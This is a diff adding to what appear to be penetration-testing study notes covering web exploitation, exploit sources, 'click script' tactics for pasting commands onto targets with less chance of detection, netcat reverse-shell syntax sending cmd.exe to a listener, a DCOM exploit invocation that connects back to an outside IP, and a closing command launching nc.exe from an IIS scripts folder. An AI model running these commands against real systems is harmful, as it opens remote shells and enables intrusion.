@@ -116,13 +116,97 @@ Targets
 		- IDS/IPS
 	- Public facing & internal servers
 	- End user workstations
-Target publicily accessible systems and pivot further into the network
+- Target publicily accessible systems and pivot further into the network
+
+Web Exploitation 
+	- SQL Injection: SQL commands are passed through a web site's input field and executed due to a failure to filter and sanitize strings
+	- Directory Traversal: "back out" of a sandboxed directory and access file system, commonly executed with "../"
+	- Parameter Tampering: manipulation of URL or HTML source code to change functionality of a web application
+
+Remote Exploitation 
+	- Remote Code Execution: ability to trigger arbitrary code execution from one machine to another
+	- Denial of Service: causes system to crash or become unusable
+Where to get exploits
+	- Attack Frameworks
+		- CANVAS
+		- IMPACT
+		- Metasploit
+	- Code them yourself
+	- Internet (needs to be analyzed for malicious code)
+		- SecurityFocus
+		- PacketStorm
+		- Exploit DB
+
+External Attack 
+	- Vulnerability Research
+	- Attack Automation
+		- Lab Building: Mock of target network that can and will be attacked repeatedly to iron out potential problems that may occur on the target
+		- Click Scripts: Files that contain a logged set of commands to copy and paste to a host. Use some form of note taking application that strips formatting. Allows replication of attack, decreases chance of detection and helps track the commands already executed and eliminates time wasted researching syntax.
+
+---------------------------------------------------------------------------
+Click Script Guidelines
+1. Script every command, however simple.
+2. Copy and Paste onto target; never type command directly onto target.
+3. Never delete lines; create a new line for every unique command.
+4. Organize commands into groups and include notes/comments.
+5. Arrange commands chronologically
+---------------------------------------------------------------------------
+
+Internal Attack Planning
+- Is difficuult because the internal network is shielded by many layers of security.
+- some assumptions must be made..
+	- What information do we know?
+	- Windows or Unix network?
+	- What is the basic topology?
+- Click scripts are made for the type of network in place; usually focus on many different commands to collect reconnaissance
+- Assumptions need to be validated
+- Run attack procedures in a lab environment and modify scripts as needed
+- Quiet access + maintain access + patience
+
+------------------------------------------------------------------
+NetCat Syntax
+Connect to somewhere:   nc [-options] hostname port[s] [ports]
+Listen for inbound:     nc -l -p port [options] 
+To Connect: nc [IP ADDRESS OF LISTENER] [PORT OF LISTENER] –e cmd.exe
+	Options:
+-d : detach from console, stealth mode
+-e : prog inbound program to exec
+-i secs : delay interval for lines sent, ports scanned
+-l : listen mode, for inbound connections
+-L : listen harder, re-listen on socket close
+-n : numeric-only IP addressess, no DNS
+-p port : local port number
+-r : randomize local and remote ports
+-t : answer TELNET negotiation
+-v : verbose [use twice to be more verbose]
+-w sec : timeout for connects and final net reads
+-z : zero-I/O mode [used for scanning]
+ 	Example: 
+ To Listen: nc -lvp 443
+ To Connect: nc 192.168.10.3 1234 –e cmd.exe
+------------------------------------------------------------------
+
+------------------------------------------------------------------
+DCOM Syntax
+d -d <host> [options]
+
+Options:
+-d Hostname to attack [required]
+-t Type [Default: 0]
+-r Return address [Default: Selected from target]
+-p Attack port [Default: 135]
+-l Bindshell port [Default: 666]
+-h the IP address to connect back to
+-P the port connect back to
+
+Types:
+0 [Win2k-Universal]
+1 [WindXP-Universal]
+Example: d -d 127.0.0.1 -h 204.139.95.100 -P 2222
+------------------------------------------------------------------
+
+Summary: 
+	- Attack plans consist of turning the vulnerabilities of a target into a plan of action for compromise
 
 
-
-
-
-
-
-
-
+start c:\inetpub\scripts\nc.exe 204.139..100 1111 -e cmd.exe
